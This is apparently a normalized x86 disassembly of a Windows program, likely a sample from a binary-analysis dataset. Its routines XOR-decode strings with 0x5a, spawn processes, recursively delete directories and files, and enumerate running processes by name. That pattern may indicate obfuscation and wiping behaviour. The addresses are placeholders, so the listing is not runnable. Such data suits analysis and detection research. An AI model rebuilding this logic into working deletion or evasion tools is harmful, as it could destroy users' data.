lea eax [ ebp - 0x1008 ]
push 0x1
push eax
call sub_40f9f8
add esp 0x10
xor ecx ecx
test eax eax
jle r-xdata
call sub_40f7be
pop ecx
push edi
call sub_40f7be
pop ecx
mov al 0x1
push edi
push eax
lea eax [ ebp - 0x1008 ]
push 0x1
push eax
call sub_40fbfb
push esi
call sub_40fd52
add esp 0x14
mov dl [ ebp + ecx - 0x1008 ]
test dl dl
je r-xdata
inc ecx
cmp ecx eax
jl r-xdata
cmp dl 0x5a
je r-xdata
xor dl 0x5a
mov [ ebp + ecx - 0x1008 ] dl
sub_408d42
push 0xffffffff
push sub_41df16
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x3c ]
mov [ fs : 0x0 ] eax
mov edi edx
mov esi ecx
xor ebp ebp
mov ecx edi
mov [ esp + 0x18 ] ebp
call sub_40228d
mov ebx eax
test ebx ebx
jne r-xdata
push ebp
push ebp
push ebp
push ebp
push ebx
mov ecx edi
call j_sub_402624#2
push eax
push ebp
push ebp
call [ WideCharToMultiByte@IAT ]
mov ebp eax
test ebp ebp
je r-xdata
mov ecx esi
call sub_409799
jmp r-xdata
lea ecx [ esp + 0x1c ]
call sub_409799
and [ esp + 0x44 ] 0x0
push ebp
lea ecx [ esp + 0x20 ]
call sub_409852
xor eax eax
push eax
push eax
push ebp
push eax
lea ecx [ esp + 0x2c ]
call sub_40983c
push eax
push ebx
mov ecx edi
call j_sub_402624#2
push eax
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
lea eax [ esp + 0x1c ]
push eax
mov ecx esi
call sub_4020e0
lea ecx [ esp + 0x1c ]
call sub_40211d
mov eax esi
mov ecx [ esp + 0x3c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x20 ]
xor ecx esp
call sub_40eb9e
add esp 0x34
retn
sub_408e20
push 0xffffffff
push sub_41dee6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x3c ]
mov [ fs : 0x0 ] eax
mov edi edx
mov esi ecx
xor ebx ebx
mov ecx edi
mov [ esp + 0x18 ] ebx
call sub_402291
test al al
je r-xdata
mov ecx edi
call sub_40228d
push ebx
mov ebp eax
push ebx
push ebp
mov ecx edi
call j_sub_40239d
push eax
push ebx
push ebx
call [ MultiByteToWideChar@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov ecx esi
call sub_402150
jmp r-xdata
lea ecx [ esp + 0x1c ]
call sub_402150
and [ esp + 0x44 ] 0x0
push ebx
lea ecx [ esp + 0x20 ]
call sub_409864
push ebx
xor ebx ebx
push ebx
lea ecx [ esp + 0x24 ]
call sub_402279
push eax
push ebp
mov ecx edi
call j_sub_40239d
push eax
push ebx
push ebx
call [ MultiByteToWideChar@IAT ]
lea eax [ esp + 0x1c ]
push eax
mov ecx esi
call sub_4021b8
lea ecx [ esp + 0x1c ]
call sub_40223f
mov eax esi
mov ecx [ esp + 0x3c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x20 ]
xor ecx esp
call sub_40eb9e
add esp 0x34
retn
sub_408f12
push ebp
mov ebp esp
sub esp 0x228
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov al [ rw-data ]
xor ecx ebp
call sub_40eb9e
leave
retn
xor eax eax
push 0x206
push eax
mov [ ebp - 0x210 ] ax
lea eax [ ebp - 0x20e ]
push eax
call sub_414c70
add esp 0xc
lea eax [ ebp - 0x210 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
lea eax [ ebp - 0x210 ]
push eax
call [ PathRemoveFileSpecW@IAT ]
push r--data
lea eax [ ebp - 0x210 ]
push eax
call [ PathAppendW@IAT ]
lea eax [ ebp - 0x210 ]
push eax
lea ecx [ ebp - 0x228 ]
call sub_402193
lea ecx [ ebp - 0x228 ]
call sub_408eff
lea ecx [ ebp - 0x228 ]
mov [ rw-data ] al
call sub_40223f
sub_408fbd
push ebp
mov ebp esp
sub esp 0x58
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push 0x40
xor ebx ebx
lea eax [ ebp - 0x44 ]
push ebx
push eax
mov esi edx
mov edi ecx
mov [ ebp - 0x48 ] 0x44
call sub_414c70
mov eax [ ebp + 0x8 ]
add esp 0xc
mov [ ebp - 0x1c ] 0x1
cmp [ eax ] bl
je r-xdata
xor eax eax
push 0x5
pop eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov al bl
xor ecx ebp
pop ebx
call sub_40eb9e
leave
retn
mov ecx [ ebp - 0x58 ]
push [ ebp - 0x54 ]
mov [ esi ] ecx
call [ CloseHandle@IAT ]
mov [ ebp - 0x18 ] ax
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
mov ecx edi
call j_sub_402624
push eax
push ebx
call [ CreateProcessW@IAT ]
test eax eax
setne bl
test bl bl
je r-xdata
sub_40904a
push 0x1a4
mov eax sub_41dde8
call sub_4113ab
mov esi ecx
call j_sub_40239d#2
push eax
call [ PathFileExistsA@IAT ]
test eax eax
je r-xdata
xor eax eax
mov ecx esi
call sub_402291
test al al
jne r-xdata
mov ecx esi
call j_sub_40239d#2
push eax
call [ GetFileAttributesA@IAT ]
test al 0x10
je r-xdata
lea ecx [ ebp - 0x40 ]
call sub_402150
xor edi edi
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] edi
call sub_409799
push r--data
mov edx esi
lea ecx [ ebp - 0x1b0 ]
mov [ ebp - 0x4 ] 0x1
call sub_409ae7
pop ecx
lea ecx [ ebp - 0x180 ]
push ecx
mov ecx eax
call j_sub_40239d#2
push eax
call [ FindFirstFileA@IAT ]
lea ecx [ ebp - 0x1b0 ]
mov ebx eax
call sub_40211d
cmp ebx 0xffffffff
je r-xdata
lea ecx [ ebp - 0x28 ]
call sub_40211d
lea ecx [ ebp - 0x40 ]
call sub_40223f
mov eax edi
jmp r-xdata
cmp [ ebp - 0x154 ] 0x2e
je r-xdata
call sub_41135a
retn
lea eax [ ebp - 0x180 ]
push eax
push ebx
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
push r--data
mov edx esi
lea ecx [ ebp - 0x198 ]
call sub_409ae7
pop ecx
push eax
lea ecx [ ebp - 0x28 ]
call sub_4097be
lea ecx [ ebp - 0x198 ]
call sub_40211d
lea eax [ ebp - 0x154 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_40981f
test [ ebp - 0x180 ] 0x10
lea ecx [ ebp - 0x28 ]
je r-xdata
push ebx
call [ FindClose@IAT ]
mov ecx esi
call j_sub_40239d#2
push eax
call [ RemoveDirectoryA@IAT ]
mov edi eax
call j_sub_40239d#2
push eax
call [ DeleteFileA@IAT ]
call sub_40904a
jmp r-xdata
sub_40918e
push ebp
mov ebp esp
sub esp 0x214
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
call sub_408f12
test al al
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40eb9e
leave
retn
mov eax [ rw-data ]
mov esi rw-data
test al 0x1
jne r-xdata
mov ecx esi
call sub_402291
test al al
je r-xdata
or eax 0x1
mov ecx esi
mov [ rw-data ] eax
call sub_402150
push sub_41e7d0
call sub_40f3c3
pop ecx
xor eax eax
push 0x206
push eax
mov [ ebp - 0x210 ] ax
lea eax [ ebp - 0x20e ]
push eax
call sub_414c70
add esp 0xc
lea eax [ ebp - 0x210 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
lea eax [ ebp - 0x210 ]
push eax
call [ PathRemoveFileSpecW@IAT ]
push r--data
lea eax [ ebp - 0x210 ]
push eax
call [ PathAppendW@IAT ]
lea eax [ ebp - 0x210 ]
push eax
mov ecx esi
call j_sub_402504
sub_40924e
push ebp
mov ebp esp
sub esp 0x63c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
xor eax eax
push 0x616
mov [ ebp - 0x620 ] ax
xor esi esi
lea eax [ ebp - 0x61e ]
push esi
push eax
mov edi ecx
call sub_414c70
add esp 0xc
lea ecx [ ebp - 0x620 ]
call sub_40a866
mov [ ebp - 0x621 ] al
lea eax [ ebp - 0x620 ]
push eax
lea ecx [ ebp - 0x63c ]
call sub_402193
push eax
mov ecx edi
call sub_4021e3
lea ecx [ ebp - 0x63c ]
call sub_40223f
mov ecx edi
call sub_40228d
mov ebx eax
test ebx ebx
jle r-xdata
mov ecx [ ebp - 0x4 ]
mov al [ ebp - 0x621 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40eb9e
leave
retn
push esi
mov ecx edi
call sub_402279
cmp [ eax ] 0x41
jb r-xdata
inc esi
cmp esi ebx
jl r-xdata
push esi
mov ecx edi
call sub_402279
cmp [ eax ] 0x5a
ja r-xdata
push esi
mov ecx edi
call sub_402279
add [ eax ] 0x20
sub_40930b
push 0x26c
mov eax sub_41de4b
call sub_4113ab
push ecx
xor ebx ebx
lea edx [ ebp + 0x8 ]
lea ecx [ ebp - 0x278 ]
mov [ ebp - 0x4 ] ebx
call sub_408e20
pop ecx
lea ecx [ ebp - 0x260 ]
push ecx
mov ecx eax
call j_sub_402624
push eax
call [ FindFirstFileW@IAT ]
lea ecx [ ebp - 0x278 ]
mov esi eax
call sub_40223f
cmp esi 0xffffffff
je r-xdata
lea ecx [ ebp + 0x8 ]
call sub_40211d
mov al bl
call sub_41135a
retn
push esi
call [ FindClose@IAT ]
mov bl 0x1
sub_40936f
push esi
push 0x104
mov esi ecx
push esi
push r--data
call [ ExpandEnvironmentStringsW@IAT ]
lea ecx [ esp + 0x8 ]
call j_sub_402624
push eax
push esi
call [ PathAppendW@IAT ]
lea ecx [ esp + 0x8 ]
call sub_40223f
mov al 0x1
pop esi
retn
sub_4093a1
push 0x22c
mov eax sub_41deb6
call sub_4113ab
mov esi ecx
xor eax eax
push 0x206
mov [ ebp - 0x21c ] ax
xor ebx ebx
lea eax [ ebp - 0x21a ]
push ebx
push eax
call sub_414c70
sub esp 0xc
mov ecx esp
push esi
call sub_402127
lea ecx [ ebp - 0x21c ]
call sub_40936f
add esp 0x18
lea eax [ ebp - 0x21c ]
push eax
lea ecx [ ebp - 0x234 ]
call sub_402193
sub esp 0x18
lea eax [ ebp - 0x234 ]
mov ecx esp
push eax
mov [ ebp - 0x4 ] ebx
call sub_402127
call sub_409691
mov ecx esp
push ecx
lea edx [ ebp - 0x234 ]
mov esi eax
call sub_408d42
pop ecx
call sub_40930b
add esp 0x18
test al al
je r-xdata
lea ecx [ ebp - 0x234 ]
call sub_40223f
mov al bl
call sub_41135a
retn
test esi esi
jle r-xdata
mov bl 0x1
sub_409464
push 0x1c
mov eax sub_41e10d
call sub_411378
call sub_409449
test al al
je r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_402193
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x28 ]
call sub_4093a1
lea ecx [ ebp - 0x28 ]
mov bl al
call sub_40223f
xor eax eax
push 0x9
pop ecx
test bl bl
cmovne eax ecx
push 0x3
pop eax
jmp r-xdata
call sub_411346
retn
sub_4094b1
push 0xffffffff
push sub_41ddaa
mov eax [ fs : 0x0 ]
push eax
sub esp 0x26c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x268 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x280 ]
mov [ fs : 0x0 ] eax
mov [ esp + 0x17 ] cl
xor ebx ebx
push ebx
push 0x2
mov [ esp + 0x290 ] ebx
call [ CreateToolhelp32Snapshot@IAT ]
mov edi eax
mov [ esp + 0x18 ] edi
cmp edi 0xffffffff
je r-xdata
lea ecx [ esp + 0x290 ]
call sub_40223f
mov al bl
mov ecx [ esp + 0x280 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x268 ]
xor ecx esp
call sub_40eb9e
add esp 0x278
retn
push 0x228
lea eax [ esp + 0x54 ]
push ebx
push eax
mov [ esp + 0x58 ] 0x22c
call sub_414c70
add esp 0xc
lea ecx [ esp + 0x34 ]
push r--data
call sub_402193
lea ecx [ esp + 0x290 ]
mov [ esp + 0x288 ] 0x1
call sub_40228d
mov ebp eax
mov esi ebx
test ebp ebp
jle r-xdata
lea eax [ esp + 0x4c ]
push eax
push edi
call [ Process32FirstW@IAT ]
jmp r-xdata
push 0x5a
pop edi
push 0x41
pop ebx
test eax eax
jne r-xdata
inc esi
cmp esi ebp
jl r-xdata
cmp ax di
ja r-xdata
push r--data
lea ecx [ esp + 0x38 ]
call j_sub_402504
lea eax [ esp + 0x70 ]
push eax
lea ecx [ esp + 0x20 ]
call sub_402193
mov ecx eax
call sub_40228d
lea ecx [ esp + 0x1c ]
mov ebp eax
call sub_40223f
mov esi ebx
test ebp ebp
jle r-xdata
push edi
call [ CloseHandle@IAT ]
push esi
lea ecx [ esp + 0x294 ]
call sub_402279
movzx eax [ eax ]
cmp ax bx
jb r-xdata
mov edi [ esp + 0x18 ]
xor ebx ebx
push 0x20
lea ecx [ esp + 0x294 ]
call sub_40226b
cmp [ esp + 0x17 ] 0x0
je r-xdata
push 0x5a
pop edi
push 0x41
pop ebx
lea edx [ esp + 0x290 ]
lea ecx [ esp + 0x34 ]
call sub_409bb9
test al al
jne r-xdata
push ecx
lea eax [ esp + 0x294 ]
push eax
lea ecx [ esp + 0x3c ]
call sub_409871
cmp eax 0xffffffff
jne r-xdata
push eax
lea ecx [ esp + 0x38 ]
call sub_40226b
inc esi
cmp esi ebp
jl r-xdata
cmp ax di
ja r-xdata
mov bl 0x1
jmp r-xdata
lea eax [ esp + 0x4c ]
push eax
push edi
call [ Process32NextW@IAT ]
movzx eax [ esp + esi * 2 + 0x70 ]
cmp ax bx
jb r-xdata
mov edi [ esp + 0x18 ]
xor ebx ebx
add eax 0x20
lea ecx [ esp + 0x34 ]
call sub_40223f
sub_409691
push 0x29c
mov eax sub_41de83
call sub_4113ab
xor esi esi
lea ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] esi
call sub_402291
test al al
je r-xdata
lea ecx [ ebp + 0x8 ]
call j_sub_402624
push eax
call [ GetFileAttributesW@IAT ]
test al 0x10
je r-xdata
lea ecx [ ebp + 0x8 ]
call j_sub_402624
push eax
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
lea ecx [ ebp + 0x8 ]
call sub_40223f
mov eax esi
call sub_41135a
retn
lea ecx [ ebp - 0x28 ]
call sub_402150
push r--data
lea edx [ ebp + 0x8 ]
lea ecx [ ebp - 0x290 ]
mov [ ebp - 0x4 ] 0x1
call sub_402e04
pop ecx
lea ecx [ ebp - 0x278 ]
push ecx
mov ecx eax
call j_sub_402624
push eax
call [ FindFirstFileW@IAT ]
lea ecx [ ebp - 0x290 ]
mov edi eax
call sub_40223f
cmp edi 0xffffffff
je r-xdata
lea ecx [ ebp - 0x28 ]
call sub_40223f
cmp [ ebp - 0x24c ] 0x2e
je r-xdata
lea eax [ ebp - 0x278 ]
push eax
push edi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea edx [ ebp + 0x8 ]
lea ecx [ ebp - 0x2a8 ]
call sub_402e04
pop ecx
push eax
lea ecx [ ebp - 0x28 ]
call sub_4021e3
lea ecx [ ebp - 0x2a8 ]
call sub_40223f
lea eax [ ebp - 0x24c ]
push eax
lea ecx [ ebp - 0x28 ]
call j_sub_402403
inc esi
push edi
call [ FindClose@IAT ]
sub_409799
push ecx
push esi
mov esi ecx
lea ecx [ esp + 0x7 ]
call sub_402385
push eax
mov ecx esi
call sub_402388
push 0x0
push 0x0
mov ecx esi
call sub_402327
mov eax esi
pop esi
pop ecx
retn
sub_4097be
push ebp
mov ebp esp
push ecx
push ecx
push edi
mov edi ecx
cmp edi [ ebp + 0x8 ]
je r-xdata
mov eax edi
pop edi
leave
retn 0x4
push 0x0
push 0x1
call sub_402327
call sub_402e89
mov ecx [ ebp + 0x8 ]
test al al
je r-xdata
call sub_402385
push eax
mov ecx edi
call sub_4022b7
push esi
lea eax [ ebp - 0x4 ]
push eax
call sub_40992a
mov ecx [ ebp + 0x8 ]
mov esi eax
lea eax [ ebp - 0x8 ]
push eax
call sub_409913
push [ esi ]
mov ecx edi
push [ eax ]
call sub_409bc5
pop esi
jmp r-xdata
sub_409871
push esi
mov esi ecx
mov ecx [ esp + 0x8 ]
call sub_40228d
push eax
push ecx
mov ecx [ esp + 0x10 ]
call sub_402624
push eax
mov ecx esi
call sub_402558
pop esi
retn 0x8
sub_409894
push esi
push edi
mov edi [ esp + 0xc ]
push edi
mov esi ecx
call sub_402a7a
test al al
je r-xdata
mov ecx [ esi + 0x10 ]
or eax 0xffffffff
push ebx
mov ebx [ esp + 0x14 ]
sub eax ecx
cmp eax ebx
jbe r-xdata
push [ esp + 0x10 ]
mov ecx esi
call sub_40239d
sub edi eax
push edi
push esi
mov ecx esi
call sub_409985
jmp r-xdata
mov ecx esi
call sub_402971
test ebx ebx
je r-xdata
pop edi
pop esi
retn 0x8
mov eax esi
pop ebx
push ebp
lea ebp [ ecx + ebx ]
push 0x0
push ebp
mov ecx esi
call sub_402a16
test al al
je r-xdata
pop ebp
push ebx
push edi
mov ecx esi
call sub_40239d
add eax [ esi + 0x10 ]
push eax
call sub_4010a2
add esp 0xc
mov ecx esi
push ebp
call sub_402695
sub_409985
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
call sub_40228d
cmp eax [ ebp + 0xc ]
jb r-xdata
mov ecx esi
call sub_4026bc
mov ecx [ ebp + 0x8 ]
call sub_40228d
sub eax [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
mov ecx [ esi + 0x10 ]
cmp eax edi
cmovb edi eax
or eax 0xffffffff
sub eax ecx
cmp eax edi
jbe r-xdata
mov ecx esi
call sub_402971
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
push ebx
lea ebx [ ecx + edi ]
push 0x0
push ebx
mov ecx esi
call sub_402a16
test al al
je r-xdata
pop ebx
mov ecx [ ebp + 0x8 ]
push edi
call sub_40239d
add eax [ ebp + 0xc ]
mov ecx esi
push eax
call sub_40239d
add eax [ esi + 0x10 ]
push eax
call sub_4010a2
add esp 0xc
mov ecx esi
push ebx
call sub_402695
sub_409a0e
push esi
mov esi ecx
or eax 0xffffffff
mov ecx [ esi + 0x10 ]
push edi
mov edi [ esp + 0xc ]
sub eax ecx
cmp eax edi
jbe r-xdata
mov ecx esi
call sub_402971
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
retn 0x8
push ebx
lea ebx [ ecx + edi ]
push 0x0
push ebx
mov ecx esi
call sub_402a16
test al al
je r-xdata
pop ebx
push ecx
push edi
push [ esi + 0x10 ]
mov ecx esi
call sub_409a5c
push ebx
mov ecx esi
call sub_402695
sub_409a5c
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0xc ] 0x1
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
jne r-xdata
push 0x0
call sub_40239d
mov edx [ ebp + 0xc ]
lea ecx [ esi + eax ]
call sub_408aa3
lea eax [ ebp - 0x4 ]
push eax
call sub_40239d
add eax esi
push eax
call sub_4010ca
pop ecx
jmp r-xdata
pop ecx
pop esi
leave
retn 0xc
sub_409abe
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov ecx edx
call sub_402403
mov ecx eax
call sub_402385
push eax
mov ecx esi
call sub_4021b8
mov eax esi
pop esi
leave
retn
sub_409ae7
push 0x8
mov eax sub_41dd7c
call sub_411378
mov edi edx
mov ebx ecx
mov [ ebp - 0x14 ] ebx
and [ ebp - 0x10 ] 0x0
call sub_409799
and [ ebp - 0x4 ] 0x0
mov ecx edi
mov [ ebp - 0x10 ] 0x1
call sub_40228d
push [ ebp + 0x8 ]
mov esi eax
call sub_401089
pop ecx
add esi eax
push esi
mov ecx ebx
call sub_409c94
push edi
mov ecx ebx
call j_sub_409cfa
push [ ebp + 0x8 ]
mov ecx ebx
call j_sub_40981f
mov eax ebx
call sub_411346
retn
sub_409b44
push ecx
and [ esp ] 0x0
push ebx
push ebp
push esi
mov ebx edx
mov ebp ecx
push edi
mov ecx ebx
call sub_409cd0
mov ecx ebx
mov esi eax
call sub_40228d
mov edi [ esp + 0x18 ]
mov ecx edi
sub esi eax
call sub_40228d
cmp eax esi
jbe r-xdata
push edi
mov ecx ebx
call sub_4023f3
mov ecx edi
call sub_409cd0
mov ecx edi
mov esi eax
call sub_40228d
mov ecx ebx
sub esi eax
call sub_40228d
cmp esi eax
jb r-xdata
push ebx
push ecx
mov ecx edi
call sub_409cc1
jmp r-xdata
mov ecx eax
call sub_402385
push eax
mov ecx ebp
call sub_4021b8
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
pop ecx
retn
sub_409bc5
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
lea eax [ ebp - 0x4 ]
push eax
mov edi ecx
call sub_40992a
mov esi [ eax ]
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
call sub_409913
push [ ebp + 0xc ]
mov ecx edi
push [ ebp + 0x8 ]
push esi
push [ eax ]
call sub_409c04
pop edi
pop esi
leave
retn 0x8
sub_409c04
push ebp
mov ebp esp
push ecx
push esi
push edi
lea eax [ ebp + 0x14 ]
mov edi ecx
push eax
lea ecx [ ebp + 0x10 ]
call sub_403273
test al al
lea eax [ ebp - 0x4 ]
mov ecx edi
push eax
je r-xdata
call sub_409913
mov esi eax
lea eax [ ebp + 0x10 ]
push eax
lea ecx [ ebp + 0x14 ]
call sub_409ed3
push eax
lea ecx [ ebp + 0x10 ]
call j_sub_40111a
push eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_409a9a
pop ecx
pop ecx
push eax
push [ esi ]
push [ ebp + 0x8 ]
call sub_409a9a
pop ecx
pop ecx
push eax
mov ecx edi
call sub_409d0a
call sub_409913
push [ ebp + 0x8 ]
mov esi eax
push [ ebp + 0xc ]
call sub_409a9a
pop ecx
pop ecx
push eax
push [ esi ]
push [ ebp + 0x8 ]
call sub_409a9a
pop ecx
pop ecx
push eax
mov ecx edi
call sub_402c06
jmp r-xdata
mov eax edi
pop edi
pop esi
leave
retn 0x10
sub_409c94
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
push edi
mov edi [ esi + 0x10 ]
cmp edi eax
ja r-xdata
pop edi
pop esi
retn 0x4
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
call sub_402a16
test al al
je r-xdata
push edi
mov ecx esi
call sub_402695
sub_409cd4
push esi
mov esi ecx
mov ecx [ esp + 0x8 ]
call sub_40228d
mov ecx [ esp + 0x8 ]
push eax
call sub_402624
push eax
push [ esi + 0x10 ]
push ecx
mov ecx esi
call sub_403212
pop esi
retn 0x4
sub_409d0a
push ebp
mov ebp [ esp + 0x10 ]
push esi
push ebp
mov esi ecx
call sub_402a7a
test al al
je r-xdata
mov edx [ esi + 0x10 ]
cmp edx [ esp + 0xc ]
jb r-xdata
push [ esp + 0x18 ]
mov ecx esi
call sub_40239d
sub ebp eax
push ebp
push esi
push [ esp + 0x1c ]
mov ecx esi
push [ esp + 0x1c ]
call sub_409eeb
jmp r-xdata
mov ecx esi
call sub_4026bc
push ebx
mov ebx [ esp + 0x1c ]
mov ecx edx
sub ecx [ esp + 0x10 ]
push edi
mov edi [ esp + 0x18 ]
cmp ecx edi
cmovb edi ecx
or eax 0xffffffff
sub edx edi
sub eax ebx
cmp eax edx
jbe r-xdata
pop esi
pop ebp
retn 0x10
mov ecx esi
call sub_402971
sub ecx edi
mov [ esp + 0x18 ] ecx
cmp ebx edi
jae r-xdata
test ebx ebx
jne r-xdata
push ecx
mov ecx esi
call sub_40239d
add eax [ esp + 0x18 ]
mov ecx esi
add eax edi
push eax
call sub_40239d
add eax [ esp + 0x1c ]
add eax ebx
push eax
call sub_4010b6
add esp 0xc
mov eax [ esi + 0x10 ]
sub eax edi
add eax ebx
push 0x0
push eax
mov ecx esi
mov [ esp + 0x28 ] eax
call sub_402a16
test al al
je r-xdata
test edi edi
je r-xdata
pop edi
mov eax esi
pop ebx
cmp edi ebx
jae r-xdata
push ebx
push ebp
mov ecx esi
call sub_40239d
add eax [ esp + 0x1c ]
push eax
call sub_4010a2
add esp 0xc
mov ecx esi
push [ esp + 0x20 ]
call sub_402695
push [ esp + 0x18 ]
mov ecx esi
call sub_40239d
add eax [ esp + 0x18 ]
mov ecx esi
add eax edi
push eax
call sub_40239d
add eax [ esp + 0x1c ]
add eax ebx
push eax
call sub_4010b6
add esp 0xc
sub_409e25
push ebx
push esi
push edi
mov edi ecx
mov ecx [ esp + 0x14 ]
or esi 0xffffffff
call sub_40228d
cmp eax esi
mov ebx esi
cmovb ebx eax
mov eax [ edi + 0x10 ]
sub esi eax
cmp esi ebx
jbe r-xdata
call sub_402971
test ebx ebx
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn 0x10
push ebp
lea ebp [ eax + ebx ]
push 0x0
push ebp
mov ecx edi
call sub_40290f
test al al
je r-xdata
pop ebp
push [ edi + 0x10 ]
mov ecx edi
call sub_402624
mov ecx edi
mov esi eax
call sub_402624
lea ecx [ eax + ebx * 2 ]
mov edx esi
call sub_401060
pop ecx
push ebx
cmp edi [ esp + 0x1c ]
jne r-xdata
mov ecx [ esp + 0x1c ]
call sub_402624
mov ecx edi
mov esi eax
call sub_402624
mov edx esi
mov ecx eax
call sub_401034
mov ecx edi
call sub_402624
mov ecx edi
mov esi eax
call sub_402624
mov edx esi
mov ecx eax
call sub_401060
jmp r-xdata
pop ecx
push ebp
mov ecx edi
call sub_4028eb
sub_409eeb
push ebp
push esi
push edi
mov edi [ esp + 0x10 ]
mov esi ecx
cmp [ esi + 0x10 ] edi
jb r-xdata
mov ecx esi
call sub_4026bc
mov ecx [ esp + 0x18 ]
call sub_40228d
mov ebp [ esp + 0x1c ]
cmp eax ebp
jb r-xdata
mov ecx [ esi + 0x10 ]
mov eax [ esp + 0x14 ]
sub ecx edi
cmp ecx eax
cmovb eax ecx
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0x18 ]
push ebx
mov [ esp + 0x18 ] eax
call sub_40228d
mov ebx [ esp + 0x24 ]
mov edx [ esi + 0x10 ]
mov ecx [ esp + 0x18 ]
sub eax ebp
cmp eax ebx
cmovb ebx eax
or eax 0xffffffff
sub edx ecx
sub eax ebx
mov [ esp + 0x20 ] edx
cmp eax edx
jbe r-xdata
mov ecx esi
call sub_402971
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x14 ]
add eax ebx
sub edx ecx
mov [ esp + 0x14 ] edx
mov [ esp + 0x20 ] eax
cmp [ esi + 0x10 ] eax
jae r-xdata
cmp esi [ esp + 0x1c ]
je r-xdata
push 0x0
push eax
mov ecx esi
call sub_402a16
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
cmp ebx ecx
ja r-xdata
push edx
mov ecx esi
call sub_40239d
add eax edi
add eax [ esp + 0x1c ]
mov ecx esi
push eax
call sub_40239d
add eax edi
add eax ebx
push eax
call sub_4010b6
mov ecx [ esp + 0x28 ]
add esp 0xc
push ebx
call sub_40239d
add eax ebp
push eax
mov ecx esi
call sub_40239d
add eax edi
push eax
call sub_4010a2
jmp r-xdata
cmp ebp edi
ja r-xdata
push ebx
mov ecx esi
call sub_40239d
add eax ebp
push eax
mov ecx esi
call sub_40239d
add eax edi
push eax
call sub_4010b6
add esp 0xc
mov ecx esi
push [ esp + 0x14 ]
call sub_40239d
add eax edi
add eax [ esp + 0x1c ]
mov ecx esi
push eax
call sub_40239d
add eax edi
add eax ebx
jmp r-xdata
add esp 0xc
mov ecx esi
push [ esp + 0x20 ]
call sub_402695
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x14
lea eax [ edi + ecx ]
cmp eax ebp
ja r-xdata
push edx
mov ecx esi
call sub_40239d
add eax edi
add eax [ esp + 0x1c ]
mov ecx esi
push eax
call sub_40239d
add eax edi
add eax ebx
push eax
call sub_4010b6
add esp 0xc
mov ecx esi
push ebx
call sub_40239d
add eax ebp
push eax
push eax
call sub_4010b6
push ecx
mov ecx esi
call sub_40239d
add eax ebp
push eax
mov ecx esi
call sub_40239d
add eax edi
push eax
call sub_4010b6
add esp 0xc
mov ecx esi
push [ esp + 0x14 ]
call sub_40239d
add eax edi
add eax [ esp + 0x1c ]
mov ecx esi
push eax
call sub_40239d
add eax edi
add eax ebx
push eax
call sub_4010b6
mov eax ebx
sub eax [ esp + 0x24 ]
add esp 0xc
mov ecx esi
push eax
call sub_40239d
add eax ebp
add eax ebx
push eax
mov ecx esi
call sub_40239d
add eax edi
add eax [ esp + 0x20 ]
push edx
mov ecx esi
call sub_40239d
add eax edi
add eax [ esp + 0x1c ]
mov ecx esi
push eax
call sub_40239d
add eax edi
add eax ebx
push eax
call sub_4010b6
add esp 0xc
mov ecx esi
